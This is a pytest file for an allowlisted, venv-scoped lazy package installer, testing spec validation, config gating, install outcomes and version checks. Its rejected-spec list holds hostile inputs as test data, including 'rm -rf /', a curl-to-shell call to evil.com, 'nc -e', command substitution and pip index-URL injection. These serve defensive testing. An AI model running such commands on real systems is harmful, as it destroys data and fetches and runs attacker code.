"""Tests for tools.lazy_deps — the supply-chain-resilient on-demand installer.

The lazy_deps module is the architectural fix for the "one quarantined
package nukes 10 unrelated extras" problem. It exposes ``ensure(feature)``
which only installs from a strict allowlist, refuses anything that looks
like a URL / file path, runs venv-scoped, and respects the
``security.allow_lazy_installs`` config flag.

These tests cover the security boundary and the public API. The real pip
call is mocked — we never actually shell out during unit tests.
"""

from __future__ import annotations

from typing import Iterator

import pytest

import tools.lazy_deps as ld


# ---------------------------------------------------------------------------
# Spec safety
# ---------------------------------------------------------------------------


class TestSpecSafety:
    @pytest.mark.parametrize("spec", [
        "mistralai>=2.3.0,<3",
        "elevenlabs>=1.0,<2",
        "honcho-ai>=2.0.1,<3",
        "boto3>=1.35.0,<2",
        "mautrix[encryption]>=0.20,<1",
        "google-api-python-client>=2.100,<3",
        "youtube-transcript-api>=1.2.0",
        "qrcode>=7.0,<8",
        "package",  # bare name, no version
        "package==1.0.0",
        "package~=1.0",
    ])
    def test_safe_specs_pass(self, spec):
        assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"

    @pytest.mark.parametrize("spec", [
        # URL-shaped → rejected (no remote origin override allowed)
        "git+https://github.com/foo/bar.git",
        "https://example.com/foo.tar.gz",
        # File path → rejected
        "/etc/passwd",
        "./local-malware",
        "../escape",
        # Shell metacharacters → rejected
        "package; rm -rf /",
        "package && curl evil.com | sh",
        "package`whoami`",
        "package$(whoami)",
        "package|nc -e",
        # Pip flag injection → rejected
        "--index-url=http://evil/",
        "-r requirements.txt",
        # Whitespace control chars → rejected
        "package\nshell-injection",
        "package\rmore",
        # Empty / overly long → rejected
        "",
        "x" * 500,
    ])
    def test_unsafe_specs_rejected(self, spec):
        assert not ld._spec_is_safe(spec), \
            f"expected {spec!r} to be rejected"


# ---------------------------------------------------------------------------
# Allowlist enforcement
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_unknown_feature_raises(self, monkeypatch):
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        with pytest.raises(ld.FeatureUnavailable, match="not in LAZY_DEPS"):
            ld.ensure("not.a.real.feature")

    def test_lazy_deps_keys_use_namespace_dot_name(self):
        # Sanity check on the data shape — every key should be at least
        # one dot-separated namespace.
        for key in ld.LAZY_DEPS:
            assert "." in key, f"feature {key!r} should be namespace.name"

    def test_every_lazy_dep_spec_passes_safety(self):
        # Defence in depth — even though specs are author-controlled,
        # the safety regex must accept everything we ship.
        for feature, specs in ld.LAZY_DEPS.items():
            for spec in specs:
                assert ld._spec_is_safe(spec), \
                    f"{feature}: spec {spec!r} fails safety check"

    def test_feature_install_command_returns_pip_invocation(self):
        cmd = ld.feature_install_command("memory.honcho")
        assert cmd is not None
        assert cmd.startswith("uv pip install")
        assert "honcho-ai" in cmd

    def test_feature_install_command_unknown(self):
        assert ld.feature_install_command("not.real") is None


# ---------------------------------------------------------------------------
# allow_lazy_installs gating
# ---------------------------------------------------------------------------


class TestSecurityGating:
    def test_disabled_via_config_raises(self, monkeypatch):
        # Pretend honcho is missing AND lazy installs are disabled.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("packageX>=1.0,<2",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        with pytest.raises(ld.FeatureUnavailable, match="lazy installs disabled"):
            ld.ensure("test.feat", prompt=False)

    def test_disabled_via_env_var(self, monkeypatch):
        monkeypatch.setenv("HERMES_DISABLE_LAZY_INSTALLS", "1")
        # Bypass config layer; the env var alone must disable.
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: {"security": {"allow_lazy_installs": True}},
        )
        assert ld._allow_lazy_installs() is False

    def test_default_allows(self, monkeypatch):
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: {"security": {}},
        )
        assert ld._allow_lazy_installs() is True

    def test_config_failure_fails_open(self, monkeypatch):
        # If config can't be read at all, we ALLOW installs rather than
        # blocking the user out of their own backends.
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: (_ for _ in ()).throw(RuntimeError("config broken")),
        )
        assert ld._allow_lazy_installs() is True


# ---------------------------------------------------------------------------
# ensure() happy/sad paths
# ---------------------------------------------------------------------------


class TestEnsure:
    def test_already_satisfied_is_noop(self, monkeypatch):
        # If the package is importable, ensure() returns without calling pip.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.satisfied", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # If pip were called, this would fail loudly.
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        ld.ensure("test.satisfied", prompt=False)  # no exception

    def test_install_success_path(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.install", ("zzzfake>=1",))
        # First check sees missing, post-install check sees installed.
        call_count = {"n": 0}

        def fake_satisfied(spec):
            call_count["n"] += 1
            return call_count["n"] > 1  # missing first, installed after

        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        ld.ensure("test.install", prompt=False)

    def test_install_failure_surfaces_pip_stderr(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.fail", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(
                False, "", "ERROR: package not found on PyPI"
            ),
        )
        with pytest.raises(ld.FeatureUnavailable, match="pip install failed"):
            ld.ensure("test.fail", prompt=False)

    def test_install_succeeds_but_still_missing_raises(self, monkeypatch):
        # Pip says success but the package still isn't importable
        # (e.g. site-packages caching, wrong python). Surface this.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.cache", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        with pytest.raises(ld.FeatureUnavailable, match="still not importable"):
            ld.ensure("test.cache", prompt=False)


# ---------------------------------------------------------------------------
# is_available
# ---------------------------------------------------------------------------


class TestIsAvailable:
    def test_unknown_feature_returns_false(self):
        assert ld.is_available("not.a.thing") is False

    def test_satisfied_returns_true(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.avail", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        assert ld.is_available("test.avail") is True

    def test_missing_returns_false(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.miss", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        assert ld.is_available("test.miss") is False


# ---------------------------------------------------------------------------
# Version-aware _is_satisfied (Piece B — "stale pin" detection)
#
# The original implementation returned True the moment the package name
# was importable, ignoring the spec's version range. That meant pin bumps
# in LAZY_DEPS never propagated to users who already lazy-installed the
# backend at an older version. _is_satisfied now parses the spec and
# checks the installed version against the constraint.
# ---------------------------------------------------------------------------


class TestIsSatisfiedVersionAware:
    def _fake_version(self, monkeypatch, installed_versions: dict):
        """Patch importlib.metadata.version() inside lazy_deps."""
        from importlib.metadata import PackageNotFoundError

        def _version(pkg):
            if pkg in installed_versions:
                return installed_versions[pkg]
            raise PackageNotFoundError(pkg)

        # Patch at the import site lazy_deps uses (inside the function).
        import importlib.metadata as _md
        monkeypatch.setattr(_md, "version", _version)

    def test_exact_pin_match_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"honcho-ai": "2.0.1"})
        assert ld._is_satisfied("honcho-ai==2.0.1") is True

    def test_exact_pin_mismatch_returns_false(self, monkeypatch):
        # Installed 2.0.0, spec requires 2.0.1 → False (needs upgrade).
        self._fake_version(monkeypatch, {"honcho-ai": "2.0.0"})
        assert ld._is_satisfied("honcho-ai==2.0.1") is False

    def test_range_within_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.27.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is True

    def test_range_above_returns_false(self, monkeypatch):
        # Installed too new for the upper bound.
        self._fake_version(monkeypatch, {"slack-bolt": "2.0.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is False

    def test_range_below_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.0.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is False

    def test_package_not_installed_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {})
        assert ld._is_satisfied("anthropic==0.86.0") is False

    def test_bare_package_name_presence_is_enough(self, monkeypatch):
        # No version constraint — presence alone counts as satisfied.
        self._fake_version(monkeypatch, {"somepkg": "1.0.0"})
        assert ld._is_satisfied("somepkg") is True

    def test_extras_block_in_spec_is_stripped(self, monkeypatch):
        # mautrix[encryption]==0.21.0 — the [encryption] block must not
        # confuse the specifier parser.
        self._fake_version(monkeypatch, {"mautrix": "0.21.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is True

    def test_extras_block_mismatch_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"mautrix": "0.20.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is False


# ---------------------------------------------------------------------------
# active_features + refresh_active_features (Piece A — hermes update wiring)
# ---------------------------------------------------------------------------


class TestActiveFeatures:
    def test_no_packages_installed_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "_is_present", lambda spec: False)
        assert ld.active_features() == []

    def test_finds_features_with_at_least_one_package_installed(self, monkeypatch):
        # Pretend only honcho-ai is installed; nothing else.
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "honcho-ai",
        )
        active = ld.active_features()
        assert "memory.honcho" in active
        # Backends the user never enabled stay quiet.
        assert "memory.hindsight" not in active
        assert "platform.slack" not in active

    def test_multi_package_feature_active_if_any_present(self, monkeypatch):
        # platform.slack has 3 packages; only one needs to be present
        # for the feature to count as active (user activated it before,
        # one transitive may have been uninstalled separately).
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "slack-bolt",
        )
        assert "platform.slack" in ld.active_features()


class TestRefreshActiveFeatures:
    def test_no_active_features_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: [])
        assert ld.refresh_active_features() == {}

    def test_already_current_is_noop(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==1.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # If pip were called, this would fail loudly.
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.refresh_active_features()
        assert result == {"test.feat": "current"}

    def test_stale_pin_triggers_reinstall(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        # First _is_satisfied check (in feature_missing) says no; after
        # install, post-install check says yes.
        states = iter([False, True])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: next(states))
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        result = ld.refresh_active_features()
        assert result == {"test.feat": "refreshed"}

    def test_install_failure_recorded_not_raised(self, monkeypatch):
        # A failed refresh must NOT raise out of hermes update.
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(
                False, "", "ERROR: PyPI 404 quarantine"
            ),
        )
        result = ld.refresh_active_features()
        assert "test.feat" in result
        assert result["test.feat"].startswith("failed:")
        assert "404 quarantine" in result["test.feat"]

    def test_lazy_installs_disabled_marked_skipped(self, monkeypatch):
        # security.allow_lazy_installs=false → don't error, mark skipped
        # so hermes update can render "respecting your config" message.
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        result = ld.refresh_active_features()
        assert "test.feat" in result
        assert result["test.feat"].startswith("skipped:")

    def test_mixed_results_returns_per_feature_status(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["a.ok", "b.fail"])
        monkeypatch.setitem(ld.LAZY_DEPS, "a.ok", ("pkga==1.0",))
        monkeypatch.setitem(ld.LAZY_DEPS, "b.fail", ("pkgb==1.0",))
        # a.ok: already satisfied → "current"
        # b.fail: missing + install fails → "failed:"
        def fake_satisfied(spec):
            return ld._pkg_name_from_spec(spec) == "pkga"
        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(False, "", "nope"),
        )
        result = ld.refresh_active_features()
        assert result["a.ok"] == "current"
        assert result["b.fail"].startswith("failed:")
